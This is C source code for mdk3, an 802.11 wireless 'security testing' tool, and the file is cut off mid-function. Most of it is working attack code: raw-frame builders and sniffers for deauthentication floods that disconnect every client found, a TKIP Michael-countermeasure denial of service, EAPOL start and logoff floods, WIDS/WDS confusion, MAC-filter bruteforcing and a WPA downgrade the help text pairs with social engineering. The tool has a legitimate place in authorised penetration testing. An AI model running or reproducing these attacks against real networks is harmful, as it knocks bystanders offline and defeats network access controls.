/*
 * mdk3, a 802.11 wireless network security testing tool
 *       Just like John the ripper or nmap, now part of most distros,
 *       it is important that the defender of a network can test it using
 *       aggressive tools.... before somebody else does.
 *
 * This file contains parts from 'aircrack' project by Cristophe Devine.
 *
 * Copyright (C) 2006-2010 Pedro Larbig
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

//Using GNU Extension getline(), not ANSI C
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <sys/time.h>
#include <pcap.h>

#include "osdep.h"
#include "debug.h"
#include "helpers.h"
#include "mac_addr.h"

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

#define VERSION "v7"

#define MICHAEL \
    "\x08\x41\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B\x00\x00\x00\x20\x00\x00\x00\x00"

#define	MAX_PACKET_LENGTH 4096
#define	MAX_APS_TRACKED 100
#define MAX_APS_TESTED 100

# define TIMEVAL_TO_TIMESPEC(tv, ts) {                                  \
        (ts)->tv_sec = (tv)->tv_sec;                                    \
        (ts)->tv_nsec = (tv)->tv_usec * 1000;                           \
}

#define LIST_REREAD_PERIOD 3

struct wids_stats
{
    int clients;
    int aps;
    int cycles;
    int deauths;
} wids_stats;

unsigned char tmpbuf[MAX_PACKET_LENGTH];     // Temp buffer for packet manipulation in send/read_packet
unsigned char pkt[MAX_PACKET_LENGTH];                // Space to save generated packet
unsigned char pkt_sniff[MAX_PACKET_LENGTH];          // Space to save sniffed packets
unsigned char pkt_check[MAX_PACKET_LENGTH];          // Space to save sniffed packets to check success
unsigned char aps_known[MAX_APS_TRACKED][ETHER_ADDR_LEN];          // Array to save MACs of known APs
int aps_known_count = 0;                     // Number of known APs
unsigned char auth[MAX_APS_TESTED][ETHER_ADDR_LEN];      // Array to save MACs of APs currently under test
int auths[MAX_APS_TESTED][4];                // Array to save status of APs under test
int auth_count;                              // Number of APs under test
int showssidwarn1=1, showssidwarn2=1;        // Show warnings for overlenght SSIDs
unsigned char *mac_sa = NULL;                        // Deauth test: Sender/Client MAC
unsigned char *mac_ta = NULL;                        //              Transmitter/BSSID MAC
int state = 0, wds = 0;                      // Current state of deauth algo
unsigned char *pkt_amok = NULL;                      // Pointer to packet for deauth mode
unsigned char *target = NULL;                        // Target for SSID Bruteforce / Intelligent Auth DoS
int exit_now = 0;                            // Tells main thread to exit
int ssid_len = 0;                            // Length of SSID used in Bruteforce mode
int ssid_eof = 0;                            // Tell other threads, SSID file has reached EOF
char brute_mode;                             // Which ASCII-characters should be used
char *brute_ssid;                            // SSID in Bruteforce mode
unsigned int end = 0;                        // Has Bruteforce mode tried all possibilities?
unsigned int turns = 0;                      // Number of tried SSIDs
unsigned int max_permutations = 1;           // Number of SSIDs possible
int real_brute = 0;                          // use Bruteforce mode?
int init_intelligent = 0;                    // Is intelligent_auth_dos initialized?
int init_intelligent_data = 0;               // Is its data list initialized?
int we_got_data = 0;                         // Sniffer thread tells generator thread if there is any data
struct clist cl;                             // List with clients for intelligent Auth DoS
struct clist *current = &cl;                 // Pointer to current client
struct clist a_data;                         // List with data frames for intelligent Auth DoS
struct clist *a_data_current = &a_data;      // And a pointer to its current frame
unsigned char *essid;                                // Pointer to ESSID for WIDS confusion
int essid_len;                               // And its length
int init_wids = 0;                           // Is WIDS environment ready?
struct clistwidsap clwa;                     // AP list for WIDS confusion
struct clistwidsap *clwa_cur = &clwa;        // Current item
struct clistwidsclient clwc;                 // CLient list for WIDS confusion
struct clistwidsclient *clwc_cur = &clwc;    // Current item
struct clistwidsap zc_own;                   // List of own APs for Zero's exploit
struct clistwidsap *zc_own_cur = &zc_own;    // Current own AP for Zero
int init_zc_own = 0;                         // Is Zero's List ready?
int init_aplist = 0;                         // Is List of APs for WIDS confusion ready?
int init_clientlist = 0;                     // Is list of clients ready?
struct ether_addr mac_base;                  // First three bytes of adress given for bruteforcing MAC filter
struct ether_addr mac_lower;                 // Last three bytes of adress for Bruteforcing MAC filter
int mac_b_init = 0;                          // Initializer for MAC bruteforcer
static pthread_mutex_t has_packet_mutex;     // Used for condition below
static pthread_cond_t has_packet;            // Pthread Condition "Packet ready"
int has_packet_really = 0;                   // Since the above condition has a timeout we want to use, we need another int here
static pthread_mutex_t clear_packet_mutex;   // Used for condition below
static pthread_cond_t clear_packet;          // Pthread Condition "Buffer cleared, get next packet"
struct timeval tv_dyntimeout;                // Dynamic timeout for MAC bruteforcer
int mac_brute_speed = 0;                     // MAC Bruteforcer Speed-o-meter
int mac_brute_timeouts = 0;                  // Timeout counter for MAC Bruteforcer
int zc_exploit = 0;                          // Use Zero_Chaos attack or standard WDS confusion?
int hopper_seconds = 1;                      // Default time for channel hopper to stay on one channel
int useqosexploit = 0;                       // Is 1 when user decided to use better TKIP QoS Exploit
int wpad_cycles = 0, wpad_auth = 0;          // Counters for WPA downgrade: completed deauth cycles, sniffed 802.1x auth packets
int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: sniffed WEP/open packets, sniffed beacons/sec



#define PKT_EAPOL_START \
	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x01\x00\x00"

#define PKT_EAPOL_LOGOFF \
	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x02\x00\x00"

#define EAPOL_TEST_START_FLOOD 0
#define EAPOL_TEST_LOGOFF      1
#define FLAG_AUTH_WPA     1
#define FLAG_AUTH_RSN     2
#define FLAG_TKIP         1
#define FLAG_CCMP         2
#define IE_WPA            "\x00\x50\xf2\x01\x01\x00"
#define IE_WPA_TKIP       "\x00\x50\xf2\x02"
#define IE_WPA_CCMP       "\x00\x50\xf2\x04"
#define IE_WPA_KEY_MGMT   "\x00\x50\xf2\x01"
#define IE_RSN            "\x30\x12\x01\x00"
#define IE_RSN_TKIP       "\x00\x0f\xac\x02"
#define IE_RSN_CCMP       "\x00\x0f\xac\x04"
#define IE_RSN_KEY_MGMT   "\x00\x0f\xac\x01"

int eapol_test;                              // the actual EAPOL test
int eapol_state = 0;                         // state of the EAPOL FSM
unsigned char eapol_src[ETHER_ADDR_LEN];                // src address used for EAPOL frames
unsigned char eapol_dst[ETHER_ADDR_LEN];                // dst address used for EAPOL frames
int eapol_wtype = FLAG_AUTH_WPA;             // default auth type: WPA
int eapol_ucast = FLAG_TKIP;                 // default unicast cipher: TKIP
int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP


		"TEST MODES:\n"

		"d   - Deauthentication / Disassociation aka \"Amok Mode\"\n"
		"      Waits for data packets and disconnects their source and destination\n"
		"      with Deauthentication and Disassociation messages.\n"
		"m   - Michael Countermeasures Shutdown Exploit (TKIP DoS)\n"
		"      Cancels all traffic continuously by faking a replay attack or by\n"
		"      injecting bursts of malformed packets.\n"
		"x   - 802.1X tests\n"
		"      EAP tests for WPA(2). Can flood EAPOL start and EAPOL logoff messages.\n"
		"w   - WIDS/WIPS Confusion\n"
		"      Confuse/Abuse Intrusion Detection and Prevention Systems by\n"
		"      cross-connecting clients to multiple WDS nodes or fake rogue APs.\n"
		"f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. More effective in\n"
		"      combination with social engineering.\n";

char use_deau[]="d   - Deauthentication / Disassociation Amok Mode\n"
		"      Kicks everybody found from AP\n"
		"      OPTIONS:\n"
		"      -w <filename>\n"
		"         Read file containing MACs not to care about (Whitelist mode)\n"
		"      -b <filename>\n"
		"         Read file containing MACs to run test on (Blacklist Mode)\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: unlimited)\n"
		"      -c [chan,chan,chan,...]\n"
		"         Enable channel hopping. Without providing any channels, mdk3 will hop an all\n"
		"         14 b/g channels. Channel will be changed every 5 seconds.\n";

char use_mich[]="m   - Michael shutdown exploitation (TKIP)\n"
		"      Cancels all traffic continuously\n"
		"      -t <bssid>\n"
		"         Set Mac address of target AP\n"
		"      -w <seconds>\n"
		"         Seconds between bursts (Default: 10)\n"
		"      -n <ppb>\n"
		"         Set packets per burst (Default: 70)\n"
		"      -j\n"
		"         Use the new TKIP QoS-Exploit\n"
		"         Needs just a few packets to shut AP down!\n"
		"      -s <pps>\n"
		"         Set speed (Default: 400)\n";

char use_eapo[]="x   - 802.1X tests\n"
		"      0 - EAPOL Start packet flooding\n"
		"            -n <ssid>\n"
		"               Use SSID <ssid>\n"
		"            -t <bssid>\n"
		"               Set MAC address of target AP\n"
		"            -w <WPA type>\n"
		"               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)\n"
		"            -u <unicast cipher>\n"
		"               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
		"            -m <multicast cipher>\n"
		"               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
		"            -s <pps>\n"
		"               Set speed (Default: 400)\n"
		"      1 - EAPOL Logoff test\n"
		"            -t <bssid>\n"
		"               Set MAC address of target AP\n"
		"            -c <bssid>\n"
		"               Set MAC address of target STA\n"
		"            -s <pps>\n"
		"               Set speed (Default: 400)\n";

char use_wids[]="w   - WIDS/WIPS/WDS Confusion\n"
		"      Confuses a WDS with multi-authenticated clients which messes up routing tables\n"
		"      -e <SSID>\n"
		"         SSID of target WDS network\n"
		"      -c [chan,chan,chan...]\n"
		"         Use channel hopping\n"
		"      -z\n"
		"         activate Zero_Chaos' WIDS exploit\n"
		"         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\n";

char use_macb[]="f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"      -t <bssid>\n"
		"         Target BSSID\n"
		"      -m <mac>\n"
		"         Set the MAC adress range to use (3 bytes, i.e. 00:12:34)\n"
		"         Without -m, the internal database will be used\n"
		"      -f <mac>\n"
		"         Set the MAC adress to begin bruteforcing with\n"
		"         (Note: You can't use -f and -m at the same time)\n";

char use_wpad[]="g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. mdk3 will let WEP and unencrypted\n"
		"      clients work, so if the sysadmin simply thinks \"WPA is broken\" he\n"
		"      sure isn't the right one for this job.\n"
		"      (this can/should be combined with social engineering)\n"
		"      -t <bssid>\n"
		"         Target network\n";


/* Sniffing Functions */


//deauth attack
unsigned char *get_target_deauth()
{
// Sniffing for data frames to find targets

    int len = 0;

    pktsux:
    len = 0;
    while (len < 22) len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
    if (! memcmp(pkt_sniff, "\x08", 1))
	return pkt_sniff;
    if (! memcmp(pkt_sniff, "\x88", 1))
	return pkt_sniff;
    goto pktsux;

}


//ATTACK WIDS
void wids_sniffer()
{
    int plen;
    struct beaconinfo bi;
    struct clistwidsap *belongsto;
    struct clistwidsclient *search;

    while (1) {
	plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);

	switch (pkt_sniff[0]) {
	case 0x80: //Beacon frame
	    bi = parse_beacon(pkt_sniff, plen);
	    //if (bi.ssid_len != essid_len) break; //Avoid segfaults
	    if (zc_exploit) { //Zero_Chaos connects to foreign APs
		if (! memcmp(essid, bi.ssid, essid_len)) { //this is an AP inside the WDS, we just add him to the list
		    if (!init_zc_own) {
			init_clistwidsap(&zc_own, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
			init_zc_own = 1;
		    } else {
			if (search_bssid(zc_own_cur, bi.bssid, ETHER_ADDR_LEN) != NULL) break; //AP is known
			add_to_clistwidsap(zc_own_cur, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
			printf("\rFound WDS AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
		    }
		break;
		}
	    } else { //But ASPj's attack does it this way!
		if (memcmp(essid, bi.ssid, essid_len)) break; //SSID doesn't match
	    }

	    if (!init_aplist) {
		init_clistwidsap(&clwa, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
		init_aplist = 1;
	    } else {
		if (search_bssid(clwa_cur, bi.bssid, ETHER_ADDR_LEN) != NULL) break; //AP is known
		add_to_clistwidsap(clwa_cur, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
	    }
	    wids_stats.aps++;
	    if (zc_exploit) {
		printf("\rFound foreign AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
	    } else {
		printf("\rFound AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
	    }
	break;

	case 0x08: //Data frame
	    if (!init_aplist) break; // If we have found no AP yet, we cannot find any clients belonging to it
	    unsigned char ds = pkt_sniff[1] & 3;	//Set first 6 bits to 0
	    unsigned char *bss = NULL;
	    unsigned char *client = NULL;
	    switch (ds) {
	    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	    case 0:
		bss = pkt_sniff + 16;
		client = NULL;	//Ad-hoc network packet - Useless for WIDS
		break;
	    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	    case 1:
		bss = pkt_sniff + 4;
		client = pkt_sniff + 10;
		break;
	    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	    case 2:
		bss = pkt_sniff + 10;
		client = pkt_sniff + 4;
		break;
	    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	    case 3:
		bss = pkt_sniff + 10;
		client = NULL;  //Intra-Distribution-System WDS packet - useless, no client involved
		break;
	    }
	    if (client == NULL) break;  // Drop useless packets
	    belongsto = search_bssid(clwa_cur, bss, ETHER_ADDR_LEN);
	    if (zc_exploit) {
		if (belongsto != NULL) break; //Zero: this client does NOT belong to target WDS, drop it
		belongsto = search_bssid(zc_own_cur, bss, ETHER_ADDR_LEN);
		if (belongsto == NULL) break; //Zero: Don't know that AP, drop
	    } else {
		if (belongsto == NULL) break; //ASPj: client is NOT in our WDS -> drop
	    }

	    if (!init_clientlist) {
		init_clistwidsclient(&clwc, client, 0, ETHER_ADDR_LEN, pkt_sniff, plen, belongsto);
		init_clientlist = 1;
	    } else {
		if (search_client(clwc_cur, client, ETHER_ADDR_LEN) != NULL) break; //Client is known
		add_to_clistwidsclient(clwc_cur, client, 0, ETHER_ADDR_LEN, pkt_sniff, plen, belongsto);
	    }


	    wids_stats.clients++;
    	    printf("\rFound Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", client[0], client[1], client[2], client[3], client[4], client[5], belongsto->bssid[0], belongsto->bssid[1], belongsto->bssid[2], belongsto->bssid[3], belongsto->bssid[4], belongsto->bssid[5]);
	break;

	case 0xB0:  // Authentication Response
	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status < 1) {	//prevent problems since many APs send multiple responses
		search->status = 1;
		search->retry = 0;
	    }
	break;

	case 0x10:  // Association Response
	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status < 2) {	//prevent problems since many APs send multiple responses
		search->status = 2;
		search->retry = 0;
		printf("\rConnected Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", pkt_sniff[4], pkt_sniff[5], pkt_sniff[6], pkt_sniff[7], pkt_sniff[8], pkt_sniff[9], pkt_sniff[16], pkt_sniff[17], pkt_sniff[18], pkt_sniff[19], pkt_sniff[20], pkt_sniff[21]);
	    }
	break;

	case 0xC0:  // Deauthentication
	case 0xA0:  // Disassociation
	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    wids_stats.deauths++;
	break;

        }
    }
}

//ATTACK WIDS
struct pckt get_data_for_wids(struct clistwidsclient *cli)
{

    struct pckt retn;
    retn.data = NULL;
    retn.len = 0;

    unsigned char ds;
    unsigned char *dst = NULL;
    unsigned char dest[ETHER_ADDR_LEN];

    //Copy packet out of the list
    memcpy(tmpbuf, cli->data, cli->data_len);

    //find DST to copy it
	ds = tmpbuf[1] & 3;		//Set first 6 bits to 0
	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		dst = tmpbuf + 16;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		dst = tmpbuf + 16;
		break;
	}
    memcpy(dest, dst, ETHER_ADDR_LEN);

    //Set Target, DST, SRC and ToDS correctly
    memcpy(tmpbuf+4 , cli->bssid->bssid, ETHER_ADDR_LEN);	//BSSID
    memcpy(tmpbuf+10, cli->mac, ETHER_ADDR_LEN);	//Source
    memcpy(tmpbuf+16, dest, ETHER_ADDR_LEN);	//Destination

    tmpbuf[1] &= 0xFC;	// Clear DS field
    tmpbuf[1] |= 0x01;	// Set ToDS bit

    //Return it to have fun with it
    retn.data = tmpbuf;
    retn.len = cli->data_len;

    return retn;

}

//ATTACK MAC filter bruteforce
void mac_bruteforce_sniffer()
{
    int plen = 0;
    int interesting_packet;
    static unsigned char last_mac[6] = "\x00\x00\x00\x00\x00\x00";
//    static unsigned char ack[10] = "\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00";

   while(1) {
      do {
	interesting_packet = 1;
	//Read packet
	plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	//is this an auth response packet?
	if (pkt_sniff[0] != 0xb0) interesting_packet = 0;
	//is it from our target
	if (! is_from_target_ap(target, pkt_sniff)) interesting_packet = 0;
	//is it a retry?
	if (! memcmp(last_mac, pkt_sniff+4, 6)) interesting_packet = 0;
      } while (! interesting_packet);
      //Buffering MAC to drop retry frames later
      memcpy(last_mac, pkt_sniff+4, 6);

      //SPEEDUP: (Doesn't work??) Send ACK frame to prevent AP from blocking the channel with retries
/*      memcpy(ack+4, target, 6);
      osdep_send_packet(ack, 10);
*/

      //Set has_packet
      has_packet_really = 1;
      //Send condition
      pthread_cond_signal(&has_packet);
      //Wait for packet to be cleared
      pthread_cond_wait (&clear_packet, &clear_packet_mutex);
    }

}


struct pckt amok_machine(char *filename)
{
    // FSM for multi-way deauthing
    static time_t t_prev = 0;

    switch (state) {
	case 0:
	    newone:

	    if (wblist) {			//Periodically re-read list every LIST_REREAD_PERIOD sec.
		if (t_prev == 0) {
		    printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
		}
		if (time(NULL) - t_prev >= LIST_REREAD_PERIOD) {
		    t_prev = time( NULL );
		    load_whitelist(filename);
		}
	    }

	    pkt_amok = get_target_deauth();
	    if ((pkt_amok[1] & '\x01') && (pkt_amok[1] & '\x02')) {	// WDS packet
		mac_sa = pkt_amok + 4;
		mac_ta = pkt_amok + 10;
		wds = 1;
	    }
	    else if (pkt_amok[1] & '\x01') {		// ToDS packet
		mac_ta = pkt_amok + 4;
		mac_sa = pkt_amok + 10;
		wds = 0;
	    }
	    else if (pkt_amok[1] & '\x02') {		// FromDS packet
		mac_sa = pkt_amok + 4;
		mac_ta = pkt_amok + 10;
		wds = 0;
	    }
	    else if ((!(pkt_amok[1] & '\x01')) && (!(pkt_amok[1] & '\x02'))) {	//AdHoc packet
		mac_sa = pkt_amok + 10;
		mac_ta = pkt_amok + 16;
		wds = 0;
	    }
	    else {
		goto newone;
	    }

	    if (wblist == 2) {			//Using Blacklist mode - Skip if neither Client nor AP is in list
		if (!(is_whitelisted(mac_ta)) && !((is_whitelisted(mac_sa))))
		    goto newone;
	    }
            if (wblist == 1) {			//Using Whitelist mode - Skip if Client or AP is in list
		if (is_whitelisted(mac_ta)) goto newone;
		if (is_whitelisted(mac_sa)) goto newone;
	    }

	    state = 1;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);
	case 1:
	    state = 2;
	    if (wds) state = 4;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 0);
	case 2:
	    state = 3;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 1);
	case 3:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 0);
	case 4:
	    state = 5;
	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 1);
	case 5:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
	}

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
}

struct pckt false_tkip(unsigned char *target)
{
    struct pckt michael, src;
    int length, i, prio;

    if (useqosexploit) {
	printf("Waiting for one QoS Data Packet...\n");

	while(1) {
	    length = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    //QoS?
	    if (pkt_sniff[0] != 0x88) continue;
	    //ToDS?
	    if (! (pkt_sniff[1] & 0x01)) continue;
	    //And not WDS?
	    if (pkt_sniff[1] & 0x02) continue;
	    //From our target?
	    if (target == NULL) break;
	    if (memcmp(pkt_sniff+4, target, ETHER_ADDR_LEN)) continue;
	    break;
	}

	unsigned char *mac = pkt_sniff + 4;

	printf("QoS PACKET to %02X:%02X:%02X:%02X:%02X:%02X with Priority %d! Reinjecting...\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_sniff[24]);
//	print_packet(pkt_sniff, length);

	prio = pkt_sniff[24];

	for (i=0; i < 3 ; i++) {
	    if (prio == i) continue;
	    pkt_sniff[24] = i;
	    osdep_send_packet(pkt_sniff, length);
	}

	i++;
	michael.data = pkt_sniff;
	michael.len = length;

	return michael;

    } else {
	// length = (rand() % 246) + 20;
	length = 32;
	src = generate_mac(0);
    
	src[0] = 0x00;
    
	michael.len = length + 32;
	michael.data = (unsigned char*) malloc(michael.len);
	memcpy(michael.data, MICHAEL, 32);
	memcpy(michael.data+4, target, ETHER_ADDR_LEN);
	memcpy(michael.data+10, src, ETHER_ADDR_LEN);
	memcpy(michael.data+16, target, ETHER_ADDR_LEN);
	free(src);

	//random extended IV
	michael.data[24] = rand() & 0xFF;
	michael.data[25] = rand() & 0xFF;
	michael.data[26] = rand() & 0xFF;
    
	//random data
	for(i=0; i<length; i++) {
	    michael.data[i+32] = rand() & 0xFF;
	}
    }

    return michael;
}

struct pckt create_assoc_frame(unsigned char *ssid, int ssid_len, unsigned char *ap, unsigned char *sta, int auth_flag, int ucast_flag, int mcast_flag)
{
  struct pckt retn;
  int ofs = 0;
  char *hdr = "\x00\x00\x3a\x01"     // type, fc, duration
	"\x00\x00\x00\x00\x00\x00"   // da
	"\x00\x00\x00\x00\x00\x00"   // sa
	"\x00\x00\x00\x00\x00\x00"   // bssid
	"\x00\xa6"                   // frag, seq
	"\x31\x05\x0a\x00"           // caps
	"\x00";                      // ssid tag

  memcpy(pkt, hdr, 29);
  memcpy(pkt + 4, ap, ETHER_ADDR_LEN);            // set AP
  memcpy(pkt + 10, sta, ETHER_ADDR_LEN);          // set STA
  memcpy(pkt + 16, ap, ETHER_ADDR_LEN);           // set BSSID
  pkt[29] = ssid_len;                // set SSID len
  memcpy(pkt + 30, ssid, ssid_len);  // set SSID
  ofs = 30 + ssid_len;
  memcpy(pkt + ofs, SUPP_RATES, 10); // set supported rates
  ofs += 10;
  memcpy(pkt + ofs, EXT_RATES, 6);   // set extended rates
  ofs += 6;

  if (auth_flag == FLAG_AUTH_WPA) {
    pkt[ofs] = 0xdd;                 // set VSA id
    pkt[ofs + 1] = 22;               // set len
    ofs += 2;
    memcpy(pkt + ofs, IE_WPA, 6);    // set WPA IE
    ofs += 6;

    // set multicast cipher stuff
    switch (mcast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
        break;
    }

    // set number of unicast ciphers (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;

    // set unicast cipher stuff
    switch (ucast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
        break;
    }

    // set number of auth key management suites (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;
    memcpy(pkt + ofs, IE_WPA_KEY_MGMT, 4);
    ofs += 4;

  } // FLAG_AUTH_WPA


  if (auth_flag == FLAG_AUTH_RSN) {
    memcpy(pkt + ofs, IE_RSN, 4);    // set RSN IE
    ofs += 4;

    // set multicast cipher stuff
    switch (mcast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
        break;
    }

    // set number of unicast ciphers (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;

    // set unicast cipher stuff
    switch (ucast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
        break;
    }

    // set number of auth key management suites (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;
    memcpy(pkt + ofs, IE_RSN_KEY_MGMT, 4);
    ofs += 4;

  } // FLAG_AUTH_RSN

  retn.len = ofs;
  retn.data = pkt;

  return retn;
}

struct pckt eapol_machine(char *ssid, int ssid_len, unsigned char *target, int flag_wtype, int flag_ucast, int flag_mcast)
{
  struct pckt retn;
  int co, flag, len;
  int wait_max_frames = 50;

  // GCC Warning avoidance
  retn.data = NULL;
  retn.len = 0;

retry:

  // FSM: auth => assoc => eapol start flood

  switch (eapol_state) {

    // assoc
    case 0:
      // create a random auth frame
      retn = create_auth_frame(target, 0, NULL);
      // save STA MAC for later purposes
      memcpy(eapol_src, retn.data + 10, 6);
      eapol_state = 1;
      return retn;

    // auth
    case 1:
      // wait for answer from AP (authentication frame)
      co = 0;
      flag = 0;
      while (1) {
        co++;
        if (co > wait_max_frames) break;
        len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
        if (pkt_sniff[0] == 0xb0) {
          printf("\ngot authentication frame: ");
          if (! memcmp(target, pkt_sniff + 10, ETHER_ADDR_LEN) && (pkt_sniff[28] == 0x00)) {
            printf("authentication was successful\n");
            flag = 1;
            break;
          } else printf("from wrong AP or failed authentication!\n");
	}
      }  // while

      if (flag) {
        eapol_state = 2;
        return create_assoc_frame((unsigned char *) ssid, ssid_len, target, eapol_src, flag_wtype, flag_ucast, flag_mcast);
      } else {
        eapol_state = 0;
        goto retry;
      }
      break;

    // EAPOL Start
    case 2:
      co = 0;
      flag = 0;
      // wait for association response frame
      while (1) {
        co++;
        if (co > wait_max_frames) break;
        len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
        if (pkt_sniff[0] == 0x10) {
          printf("got association response frame: ");
          if (! memcmp(target, pkt_sniff + 10, ETHER_ADDR_LEN) && (pkt_sniff[26] == 0x00) ) {
            printf("association was successful\n");
            flag = 1;
            break;
          } else printf("from wrong AP or failed association!\n");
	}
      }  // while

      if (flag) {
        eapol_state = 3;
        goto retry;
      } else {
        // retry auth and assoc
        eapol_state = 0;
        goto retry;
      }
      break;

    case 3:
      memcpy(pkt, PKT_EAPOL_START, 36);
      memcpy(pkt + 4, target, ETHER_ADDR_LEN);
